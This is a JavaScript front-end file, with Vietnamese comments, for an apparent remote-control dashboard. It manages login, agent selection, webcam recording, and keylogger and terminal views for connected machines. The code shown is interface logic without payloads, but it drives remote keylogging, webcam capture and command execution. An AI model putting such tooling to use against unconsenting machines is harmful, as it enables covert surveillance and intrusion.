                                <div class="w-8 h-8 rounded-lg bg-white dark:bg-slate-700 border border-slate-200 dark:border-slate-600 flex items-center justify-center shadow-sm group-hover:scale-110 transition-transform">
                                    <i class="fas fa-desktop text-slate-500 dark:text-slate-300 group-hover:text-blue-500"></i>
                                </div>
                                <div>
                                    <p class="text-sm font-bold text-slate-700 dark:text-slate-200 font-mono group-hover:text-blue-600 dark:group-hover:text-blue-400">${agentId}</p>
                                    <p class="text-[10px] text-green-500 font-semibold flex items-center gap-1">
                                        <span class="w-1 h-1 rounded-full bg-green-500"></span> Online
                                    </p>
                                </div>
                            </div>

                            ${isSelected ? '<i class="fas fa-check-circle text-blue-500 text-sm"></i>' : ''}
                        </li>
                    `;
                    
                    listContainer.insertAdjacentHTML('beforeend', itemHTML);
                });

                // 3. Logic chọn máy mặc định (như cũ)
                if (!agentList.includes(currentSelection)) {
                    // Nếu chưa chọn máy nào hoặc máy cũ mất kết nối -> Chọn máy đầu
                    window.selectAgentItem(agentList[0]);
                } else {
                    // Cập nhật lại UI Trigger cho máy đang chọn (để đảm bảo đèn xanh sáng)
                    updateTriggerUI(currentSelection, true);
                }

            } else {
                // --- KHÔNG CÓ MÁY NÀO ---
                listContainer.innerHTML = `
                    <div class="flex flex-col items-center justify-center py-6 text-slate-400">
                        <i class="fas fa-search mb-2 text-2xl opacity-50"></i>
                        <p class="text-xs">Không tìm thấy Agent nào.</p>
                        <p class="text-[10px] mt-1 opacity-60">Hãy kiểm tra kết nối trên máy trạm.</p>
                    </div>
                `;
                CONFIG.AGENT_ID = null;
                updateTriggerUI("No Agents", false);
                Utils.updateStatus("Chờ kết nối...", "warning");
            }
        }
    };

    startSignalR(dynamicUrl, username, password, callbacks)
    .then((conn) => {
        // SỬA LỖI: Nhận biến conn từ resolve
        state.connection = conn; 
        state.currentUser = username;
        
        const userDisplay = document.getElementById('user-display');
        if(userDisplay) userDisplay.textContent = `Hi, ${username}`;
        
        Utils.updateStatus("Đã kết nối an toàn", "success");
        
        // Lưu IP lại
        localStorage.setItem('saved_server_ip', serverIp);

        const loginScreen = document.getElementById('login-screen');
        const appScreen = document.getElementById('app');

        loginScreen.classList.add('opacity-0');
        setTimeout(() => {
            loginScreen.classList.add('hidden');
            appScreen.classList.remove('hidden');
            setTimeout(() => {
                appScreen.classList.remove('opacity-0');
                switchView(state.currentView);
            }, 50);
        }, 500);
    })
    .catch((err) => {
        console.warn("Login Failed:", err);
        btnText.textContent = "Đăng Nhập";
        btnLoader.classList.add('hidden');
        loginBtn.disabled = false;
        if(errorMsg) {
             errorMsg.textContent = "Lỗi kết nối hoặc sai mật khẩu!";
             errorMsg.classList.remove('hidden');
        }
    });
}

function doLogout() {
    if (state.connection) state.connection.stop();
    location.reload();
}

document.addEventListener('DOMContentLoaded', () => {
    setupThemeToggle();
    const toggleBtn = document.getElementById('sidebar-toggle');
            const sidebar = document.getElementById('sidebar');
            
            // Logic đóng mở Sidebar
            if(toggleBtn && sidebar) {
                toggleBtn.addEventListener('click', () => {
                    sidebar.classList.toggle('sidebar-collapsed');
                    sidebar.classList.toggle('w-64');
                    
                    // Khi đóng, nút 3 gạch sẽ nằm giữa
                    if(sidebar.classList.contains('sidebar-collapsed')) {
                        // Logic CSS class đã xử lý việc ẩn text
                    }
                });
            }

            // Đổi tiêu đề khi bấm Tab
            const tabs = document.querySelectorAll('.tab-btn');
            tabs.forEach(btn => {
                btn.addEventListener('click', function() {
                    tabs.forEach(t => {
                        t.classList.remove('bg-slate-100', 'shadow-inner');
                    });
                    this.classList.add('bg-slate-100', 'shadow-inner');
                    
                    const titleMap = {
                        'applications': 'Ứng dụng',
                        'processes': 'Tiến trình',
                        'screenshot': 'Screenshot',
                        'keylogger': 'Keylogger',
                        'webcam': 'Webcam',
                        'system': 'Cấu hình Hệ thống',
                        'terminal': 'Terminal',
                        'automation': 'Tương tác',
                        'about': 'Giới Thiệu Dự Án'
                    };
                    const view = this.getAttribute('data-view');
                    const titleIcon = this.querySelector('i').className;
                    
                    // Cập nhật tiêu đề + Icon trên Header
                    const pageTitle = document.getElementById('page-title');
                    pageTitle.innerHTML = `<i class="mr-2 text-slate-500"></i> ${titleMap[view] || 'Dashboard'}`;
                });
            });

    // ... (Các event Login, Logout, Agent Select giữ nguyên) ...
    const agentSelect = document.getElementById('agent-select');
    if (agentSelect) {
        agentSelect.addEventListener('change', (e) => {
            agentId = e.target.value;
            refreshCurrentViewData();
            if (state.currentView === 'processes' || state.currentView === 'system') {
                sendCommand('sys_specs');
            }
        });
    }

    // Bind Tab Click
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.addEventListener('click', (e) => switchView(e.currentTarget.dataset.view));
    });

    // Bind Login
    const loginForm = document.getElementById('login-form');
    if(loginForm) {
        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();
            doLogin(document.getElementById('username-input').value, document.getElementById('password-input').value);
        });
    }

    // Bind Logout
    const logoutBtn = document.getElementById('logout-btn');
    if(logoutBtn) logoutBtn.addEventListener('click', doLogout);
    
    // Tự động điền IP cũ
    const savedIp = localStorage.getItem('saved_server_ip');
    if (savedIp) {
        const ipField = document.getElementById('server-ip');
        if(ipField) ipField.value = savedIp;
    }

    const header = document.getElementById('main-header');
    const showHeaderBtn = document.getElementById('show-header-btn');
    const hideHeaderBtn = document.getElementById('hide-header-btn');

    if (header && showHeaderBtn && hideHeaderBtn) {
        // Sự kiện: Bấm nút Ẩn (trên Header)
        hideHeaderBtn.addEventListener('click', () => {
            // Ẩn header bằng cách set display: none hoặc slide-up
            header.style.display = 'none'; 
            // Hiện nút Floating
            showHeaderBtn.classList.remove('hidden');
        });

        // Sự kiện: Bấm nút Hiện (Floating)
        showHeaderBtn.addEventListener('click', () => {
            // Hiện lại header
            header.style.display = 'flex';
            // Ẩn nút Floating
            showHeaderBtn.classList.add('hidden');
        });
    }
});














// [File: Public/Js/main.js] - Tìm và thay thế hàm toggleRecording

function toggleRecording() {
    const btn = document.getElementById('record-btn');
    const btnText = document.getElementById('record-btn-text');
    const timerUI = document.getElementById('recording-ui'); // Đây là cái overlay trên video
    const img = document.getElementById('webcam-stream');
    const canvas = document.getElementById('hidden-recorder-canvas');

    if (!state.webcam.isRecording) {
        // --- BẮT ĐẦU GHI ---
        if (!state.webcam.isStreaming || img.style.display === 'none') {
            alert("Vui lòng bật Webcam trước khi ghi hình!");
            return;
        }

        // ... (Giữ nguyên logic Canvas & MediaRecorder cũ) ...
        // 1. Chuẩn bị Canvas
        canvas.width = img.naturalWidth || 1280;
        canvas.height = img.naturalHeight || 720;
        const ctx = canvas.getContext('2d');

        // 2. Tạo stream (30FPS)
        const stream = canvas.captureStream(30);
        state.webcam.recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        state.webcam.recordedChunks = [];

        state.webcam.recorder.ondataavailable = (e) => {
            if (e.data.size > 0) state.webcam.recordedChunks.push(e.data);
        };

        state.webcam.recorder.onstop = () => {
            showSaveVideoModal();
        };

        // 3. Vẽ liên tục
        state.webcam.canvasDrawerInterval = setInterval(() => {
            if (img.complete && img.naturalHeight !== 0) {
                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
            }
        }, 1000 / 30);

        // 4. Start Recorder
        state.webcam.recorder.start();
        state.webcam.isRecording = true;
        state.webcam.recordStartTime = Date.now();

        // 5. CẬP NHẬT UI (MỚI)
        // Đổi nút bấm thành trạng thái "Đang ghi" (Nền đỏ)
        btn.classList.add('bg-red-500', 'text-white', 'border-transparent', 'hover:bg-red-600');
        btn.classList.remove('bg-white', 'text-red-500', 'hover:bg-red-50', 'dark:bg-slate-800');
        btnText.textContent = "Dừng lại";
        
        // Hiện Overlay REC trên video
        timerUI.classList.remove('hidden');

        // 6. Timer Loop
        state.webcam.recordTimerInterval = setInterval(updateRecordTimer, 1000);

    } else {
        // --- DỪNG GHI ---
        stopRecordingProcess();
        
        // RESET UI (MỚI)
        // Trả nút bấm về mặc định (Nền trắng, viền đỏ)
        btn.classList.remove('bg-red-500', 'text-white', 'border-transparent', 'hover:bg-red-600');
        btn.classList.add('bg-white', 'text-red-500', 'hover:bg-red-50', 'dark:bg-slate-800');
        btnText.textContent = "Ghi hình";
        
        // Ẩn Overlay REC
        timerUI.classList.add('hidden');
    }
}

function stopRecordingProcess() {
    if (state.webcam.recorder && state.webcam.recorder.state !== 'inactive') {
        state.webcam.recorder.stop();
    }
    state.webcam.isRecording = false;
    clearInterval(state.webcam.recordTimerInterval);
    clearInterval(state.webcam.canvasDrawerInterval);
    document.getElementById('record-timer').textContent = "00:00";
}

function updateRecordTimer() {
    const elapsed = Math.floor((Date.now() - state.webcam.recordStartTime) / 1000);
    const min = String(Math.floor(elapsed / 60)).padStart(2, '0');
    const sec = String(elapsed % 60).padStart(2, '0');
    const timerEl = document.getElementById('record-timer');
    if(timerEl) timerEl.textContent = `${min}:${sec}`;
}

// --- LOGIC LƯU VIDEO (MODAL) ---

function showSaveVideoModal() {
    const modal = document.getElementById('save-video-modal');
    const nameInput = document.getElementById('video-filename');
    const videoPlayer = document.getElementById('playback-video');
    const sizeInfo = document.getElementById('video-size-info');
    
    // Đặt tên mặc định
    const now = new Date();
    const defaultName = `RCS_Rec_${now.getHours()}${now.getMinutes()}_${now.getDate()}${now.getMonth()+1}`;
    nameInput.value = defaultName;
    
    // --- 1. TẠO BLOB VÀ URL ĐỂ PREVIEW ---
    const blob = new Blob(state.webcam.recordedChunks, { type: 'video/webm' });
    
    // Hiển thị dung lượng file
    const sizeMB = (blob.size / (1024 * 1024)).toFixed(2);
    if(sizeInfo) sizeInfo.textContent = `${sizeMB} MB`;

    // Tạo URL ảo
    const videoUrl = URL.createObjectURL(blob);
    
    // Gán vào player để xem ngay lập tức
    if (videoPlayer) {
        videoPlayer.src = videoUrl;
        // Load lại để trình duyệt nhận diện độ dài video (hỗ trợ tua)
        videoPlayer.load();
    }

    modal.classList.remove('hidden');

    // Hàm dọn dẹp bộ nhớ (Chỉ gọi khi bấm Đóng)
    const cleanup = () => {
        if (videoPlayer) {
            videoPlayer.pause();
            videoPlayer.src = ""; // Ngắt nguồn video
        }
        URL.revokeObjectURL(videoUrl); // Giải phóng RAM trình duyệt
        state.webcam.recordedChunks = []; // Xóa dữ liệu tạm
        modal.classList.add('hidden');
    };

    // Xử lý nút Lưu (Download tùy ý)
    const saveBtn = document.getElementById('confirm-save-video');
    
    // Clone node để xóa các event listener cũ (tránh bị click đúp)
    const newSaveBtn = saveBtn.cloneNode(true);
    saveBtn.parentNode.replaceChild(newSaveBtn, saveBtn);

    newSaveBtn.onclick = () => {
        let filename = nameInput.value.trim() || defaultName;
        if (!filename.endsWith('.webm')) filename += '.webm';
        
        // Tải xuống file
        const a = document.createElement('a');
        a.href = videoUrl;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        
        // Không gọi cleanup() ở đây để người dùng có thể tải lại nếu muốn
        // Hiệu ứng nhẹ để báo đã lưu
        const originalText = newSaveBtn.innerHTML;
        newSaveBtn.innerHTML = '<i class="fas fa-check mr-2"></i> Đã Lưu';
        newSaveBtn.classList.replace('bg-blue-600', 'bg-green-600');
        setTimeout(() => {
            newSaveBtn.innerHTML = originalText;
            newSaveBtn.classList.replace('bg-green-600', 'bg-blue-600');
        }, 2000);
    };

    // Xử lý nút Đóng (Hủy & Xóa)
    const cancelBtn = document.getElementById('cancel-save-video');
    const newCancelBtn = cancelBtn.cloneNode(true);
    cancelBtn.parentNode.replaceChild(newCancelBtn, cancelBtn);

    newCancelBtn.onclick = () => {
        // Hỏi xác nhận nếu file lớn (tránh bấm nhầm mất video)
        if (blob.size > 1024 * 1024 * 5) { // Nếu > 5MB
            if (!confirm("Video chưa được lưu sẽ bị xóa vĩnh viễn. Bạn chắc chắn muốn đóng?")) return;
        }
        cleanup();
    };
}















function enableAutoResize(inputId) {
    const input = document.getElementById(inputId);
    if (!input) return;

    // 1. Tạo một thẻ span ẩn để đo độ rộng chữ
    // Chúng ta phải sao chép font chữ của input sang span này để đo cho chuẩn
    const measureSpan = document.createElement('span');
    measureSpan.style.visibility = 'hidden';
    measureSpan.style.position = 'absolute';
    measureSpan.style.whiteSpace = 'pre'; // Giữ nguyên khoảng trắng
    measureSpan.style.pointerEvents = 'none';
    document.body.appendChild(measureSpan);

    const updateWidth = () => {
        // Copy style font từ input sang span đo
        const styles = window.getComputedStyle(input);
        measureSpan.style.font = styles.font;
        measureSpan.style.fontSize = styles.fontSize;
        measureSpan.style.fontFamily = styles.fontFamily;
        measureSpan.style.fontWeight = styles.fontWeight;
        measureSpan.style.letterSpacing = styles.letterSpacing;

        // Lấy nội dung (nếu rỗng thì lấy placeholder để đo độ rộng tối thiểu)
        measureSpan.textContent = input.value || input.placeholder;

        // Tính toán độ rộng: Độ rộng chữ + Padding trái (icon) + Padding phải
        // 40px là padding-left (chỗ icon), 20px là padding-right dư ra cho đẹp
        const newWidth = measureSpan.offsetWidth + 60; 

        // Gán độ rộng mới
        input.style.width = `${newWidth}px`;
    };

    // Lắng nghe sự kiện gõ phím
    input.addEventListener('input', updateWidth);
    
    // Gọi 1 lần lúc đầu để setup
    updateWidth();
}

enableAutoResize('process-search');

function toggleSidebar() {
    const sidebar = document.getElementById('sidebar');
    if (!sidebar) return;

    // Kiểm tra trạng thái hiện tại (đang thu nhỏ hay mở rộng?)
    // w-20: Thu nhỏ (Collapsed)
    // w-64: Mở rộng (Expanded)
    const isCollapsed = sidebar.classList.contains('w-20');

    if (isCollapsed) {
        // MỞ RỘNG RA
        sidebar.classList.remove('w-20', 'sidebar-collapsed');
        sidebar.classList.add('w-64');
    } else {
        // THU NHỎ LẠI
        sidebar.classList.remove('w-64');
        sidebar.classList.add('w-20', 'sidebar-collapsed');
    }
}






function setupThemeToggle() {
    const themeToggleBtn = document.getElementById('theme-toggle');
    const html = document.documentElement;
    
    if (themeToggleBtn) {
        themeToggleBtn.addEventListener('click', () => {
            if (html.classList.contains('dark')) {
                html.classList.remove('dark');
                localStorage.setItem('theme', 'light');
            } else {
                html.classList.add('dark');
                localStorage.setItem('theme', 'dark');
            }
        });
    }
}

window.toggleAboutItem = (id) => {
    const content = document.getElementById(id);
    const icon = document.getElementById(`icon-${id}`);
    
    if (!content || !icon) return;

    // Kiểm tra trạng thái hiện tại
    const isHidden = content.classList.contains('hidden');

    // 1. Đóng tất cả các tab khác (Optional: Nếu muốn chỉ mở 1 cái 1 lúc)
    // Để trải nghiệm tốt hơn, ta nên đóng các cái khác lại
    document.querySelectorAll('[id^="guide-"]').forEach(el => {
        if (el.id !== id && !el.classList.contains('hidden')) {
            el.classList.add('hidden');
            // Reset icon của cái bị đóng
            const otherIcon = document.getElementById(`icon-${el.id}`);
            if(otherIcon) otherIcon.style.transform = 'rotate(0deg)';
        }
    });

    // 2. Toggle cái hiện tại
    if (isHidden) {
        content.classList.remove('hidden');
        content.classList.add('animate-fade-in'); // Thêm hiệu ứng fade nhẹ
        icon.style.transform = 'rotate(180deg)'; // Xoay mũi tên lên
    } else {
        content.classList.add('hidden');
        icon.style.transform = 'rotate(0deg)'; // Xoay mũi tên xuống
    }
};



const agentSelect = document.getElementById('agent-select');
if (agentSelect) {
    agentSelect.addEventListener('change', (e) => {
        const newAgentId = e.target.value;
        
        // 1. Cập nhật ID mục tiêu
        CONFIG.AGENT_ID = newAgentId;
        console.log("-> Chuyển sang điều khiển:", newAgentId);
        Utils.updateStatus(`Đã chuyển sang: ${newAgentId}`, 'success');

        // 2. Làm mới dữ liệu trên màn hình hiện tại (để không hiển thị dữ liệu của máy cũ)
        // Ví dụ: Đang xem Process máy A, chuyển sang máy B thì phải load Process máy B
        switch (state.currentView) {
            case 'system':
            case 'processes':
                sendCommand('sys_specs');
                if (state.currentView === 'processes') sendCommand('process_list');
                break;
            case 'applications':
                sendCommand('app_list');
                break;
            case 'terminal':
                document.getElementById('terminal-output').innerHTML = ''; // Xóa màn hình terminal cũ
                sendCommand('term_start'); // Mở terminal máy mới
                break;
            case 'webcam':
                // Tắt webcam máy cũ (nếu đang bật)
                state.webcam.isStreaming = false; 
                document.getElementById('webcam-stream').style.display = 'none';
                document.getElementById('webcam-placeholder').style.display = 'flex';
                break;
        }
    });
}


window.toggleAgentDropdown = () => {
    const menu = document.getElementById('agent-dropdown-menu');
    const arrow = document.getElementById('agent-trigger-arrow');
    
    if (!menu) return;

    if (menu.classList.contains('hidden')) {
        // Mở menu
        menu.classList.remove('hidden');
        // Hiệu ứng Fade-in + Zoom-in nhẹ
        setTimeout(() => {
            menu.classList.remove('scale-95', 'opacity-0');
            menu.classList.add('scale-100', 'opacity-100');
        }, 10);
        arrow.style.transform = 'rotate(180deg)';
    } else {
        // Đóng menu
        closeAgentDropdown();
    }
};

function closeAgentDropdown() {
    const menu = document.getElementById('agent-dropdown-menu');
    const arrow = document.getElementById('agent-trigger-arrow');
    if (!menu) return;

    // Hiệu ứng đóng
    menu.classList.remove('scale-100', 'opacity-100');
    menu.classList.add('scale-95', 'opacity-0');
    
    arrow.style.transform = 'rotate(0deg)';
    
    // Đợi animation xong mới ẩn hẳn
    setTimeout(() => {
        menu.classList.add('hidden');
    }, 200);
}

window.selectAgentItem = (agentId) => {
    // Nếu đang chọn đúng máy đó rồi thì không làm gì cả (tránh reload không cần thiết)
    if (CONFIG.AGENT_ID === agentId) return;

    console.log(`[Switch] Đang chuyển từ ${CONFIG.AGENT_ID} sang ${agentId}`);

    // 1. Cập nhật ID mục tiêu
    CONFIG.AGENT_ID = agentId;
    
    // 2. Cập nhật UI nút Trigger (Dropdown button)
    updateTriggerUI(agentId, true);

    // 3. Đóng menu dropdown
    closeAgentDropdown();

    // 4. DỌN DẸP DỮ LIỆU CŨ (QUAN TRỌNG: Tránh hiển thị dữ liệu máy cũ)
    state.globalProcessData = [];
    state.globalAppData = [];
    
    // Reset Terminal
    const termOutput = document.getElementById('terminal-output');
    if (termOutput) termOutput.innerHTML = '<div class="text-yellow-500 mb-2">--- Đã chuyển kết nối sang máy mới ---</div>';

    // Reset Webcam UI nếu đang mở
    if (state.currentView === 'webcam') {
        state.webcam.isStreaming = false;
        const vid = document.getElementById('webcam-stream');
        const ph = document.getElementById('webcam-placeholder');
        if (vid) { vid.style.display = 'none'; vid.src = ""; }
        if (ph) ph.style.display = 'flex';
        document.getElementById('cam-status-text').textContent = "Camera Offline";
    }

    // Reset Keylogger
    const keylogRaw = document.getElementById('keylogger-log-raw');
    if (keylogRaw) keylogRaw.value = "";

    // 5. Cập nhật lại danh sách bên trái (để hiện dấu tích xanh ở máy mới)
    // Chúng ta gọi lại hàm render danh sách agent nếu cần, hoặc chỉ update UI
    const allItems = document.querySelectorAll('#agent-list-container li');
    allItems.forEach(li => {
        // Xóa icon check cũ
        const checkIcon = li.querySelector('.fa-check-circle');
        if(checkIcon) checkIcon.remove();
        
        // Thêm icon check vào dòng đang chọn
        if(li.textContent.includes(agentId)) {
             li.insertAdjacentHTML('beforeend', '<i class="fas fa-check-circle text-blue-500 text-sm"></i>');
        }
    });

    // 6. TẢI DỮ LIỆU MỚI NGAY LẬP TỨC
    Utils.updateStatus(`Đã kết nối: ${agentId}`, 'success');
    
    // Gửi lệnh tương ứng với View đang mở
    setTimeout(() => {
        switch (state.currentView) {
            case 'system':
            case 'processes':
                document.getElementById('process-list-body').innerHTML = Utils.getLoadingRow(5);
                sendCommand('sys_specs');
                if (state.currentView === 'processes') sendCommand('process_list');
                break;
            case 'applications':
                document.getElementById('app-list-body').innerHTML = Utils.getLoadingRow(4);
                sendCommand('app_list');
                break;
            case 'terminal':
                sendCommand('term_start');
                break;
        }
    }, 300); // Delay nhẹ để Server kịp xử lý
};


// --- 2. SỬA HÀM REFRESH (Để gọi Server thật) ---
window.refreshAgentList = async () => {
    const btn = document.getElementById('btn-refresh-agents');
    const icon = document.getElementById('icon-refresh');
    
    // 1. UI Loading
    if(icon) icon.classList.add('fa-spin');
    if(btn) {
        btn.classList.add('text-slate-400', 'cursor-not-allowed');
        btn.innerHTML = '<i class="fas fa-sync-alt fa-spin"></i> Syncing...';
    }

    // 2. GỌI SERVER THẬT
    await requestAgentList();

    // Lưu ý: Chúng ta không cần reset UI button ở đây ngay lập tức.
    // Vì khi Server trả về "UpdateAgentList", callback `onAgentListUpdate` (ở đoạn code login) sẽ chạy.
    // Tuy nhiên, để UX mượt mà, ta sẽ set timeout reset button
    
    setTimeout(() => {
        if(icon) icon.classList.remove('fa-spin');
        if(btn) {
            btn.classList.remove('text-slate-400', 'cursor-not-allowed');
            btn.innerHTML = '<i class="fas fa-sync-alt"></i> Refresh List';
        }
    }, 1000); 
};

function updateTriggerUI(text, isOnline) {
    const txt = document.getElementById('agent-trigger-text');
    const box = document.getElementById('agent-trigger-icon-box');
    
    if(txt) txt.textContent = text;
    
    if(box) {
        if(isOnline) {
            // Xanh lá + Glow
            box.className = "w-2 h-2 rounded-full bg-green-500 shadow-[0_0_8px_rgba(34,197,94,0.8)] animate-pulse";
        } else {
            // Đỏ hoặc Xám
            box.className = "w-2 h-2 rounded-full bg-slate-400";
        }
    }
}

// Đóng menu khi click ra ngoài
document.addEventListener('click', (e) => {
    const container = document.getElementById('custom-agent-dropdown');
    if (container && !container.contains(e.target)) {
        closeAgentDropdown();
    }
});
